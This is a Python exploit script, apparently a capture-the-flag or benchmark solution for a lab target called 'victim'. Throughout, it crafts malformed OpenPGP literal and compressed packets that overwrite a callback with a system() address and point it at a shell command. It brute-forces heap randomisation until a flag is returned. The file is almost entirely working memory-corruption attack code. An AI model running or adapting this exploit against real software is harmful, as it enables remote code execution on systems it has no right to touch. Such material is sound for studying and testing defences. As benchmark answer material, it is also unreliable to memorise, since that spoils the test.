#!/usr/bin/env python3
import os
import re
import socket
import sys

HOST = os.environ.get("VICTIM_HOST", "victim")
PORT = int(os.environ.get("VICTIM_PORT", "33333"))
MAX_ROUNDS = int(os.environ.get("POC_ROUNDS", "32"))
SYSTEM_PLT = 0x403330


def packet_length(size: int) -> bytes:
    if size < 192:
        return bytes([size])
    if size <= 8383:
        size -= 192
        return bytes([(size >> 8) + 192, size & 0xFF])
    return b"\xff" + size.to_bytes(4, "big")


def packet(tag: int, body: bytes) -> bytes:
    return bytes([0xC0 | tag]) + packet_length(len(body)) + body


def literal(filename_length: int, write_bytes: bytes, write_offset: int,
            fill: int, data: bytes = b"X") -> bytes:
    filename = bytearray([fill] * filename_length)
    filename[22:26] = write_bytes[::-1]
    filename[26:30] = ((write_offset - 2) & 0xFFFFFFFF).to_bytes(4, "little")
    body = b"b" + bytes([filename_length]) + filename + b"\0" * 4 + data
    return packet(11, body)


def compressed(literal_packet: bytes) -> bytes:
    return packet(8, b"\0" + literal_packet)


def exploit_payload(heap_nibble: int) -> bytes:
    command = b"/opt/cybingym/.h*/c*;#\0"
    prefix = b"CYBINGYM_COMMAND_MARKER_"
    heap_base_low = (heap_nibble << 12) | 0x2F0
    command_low = (heap_base_low - 0xB1EE) & 0xFFFF

    overwrite_primary_callback = compressed(literal(
        127,
        SYSTEM_PLT.to_bytes(4, "little"),
        0x2228,
        ord("a"),
        prefix + command,
    ))
    redirect_cookie_pointer = compressed(literal(
        86,
        b"AA" + command_low.to_bytes(2, "little"),
        0x21F6,
        ord("b"),
        b"Y",
    ))
    preserve_second_pass_layout = compressed(literal(
        127,
        (0x55667788).to_bytes(4, "little"),
        0x333,
        ord("c"),
        b"Z",
    ))
    return overwrite_primary_callback + redirect_cookie_pointer + preserve_second_pass_layout


def run_attempt(payload: bytes) -> bytes:
    with socket.create_connection((HOST, PORT), timeout=5) as connection:
        connection.settimeout(8)
        connection.sendall(payload)
        connection.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            try:
                chunk = connection.recv(65536)
            except (ConnectionResetError, socket.timeout):
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def main() -> int:
    for round_number in range(1, MAX_ROUNDS + 1):
        for heap_nibble in range(16):
            try:
                output = run_attempt(exploit_payload(heap_nibble))
            except OSError:
                continue
            match = re.search(rb"flag\{[^\r\n}]+\}", output)
            if match:
                flag = match.group().decode("ascii")
                print(flag)
                return 0
        print(f"completed ASLR round {round_number}", file=sys.stderr)
    print("flag not recovered", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
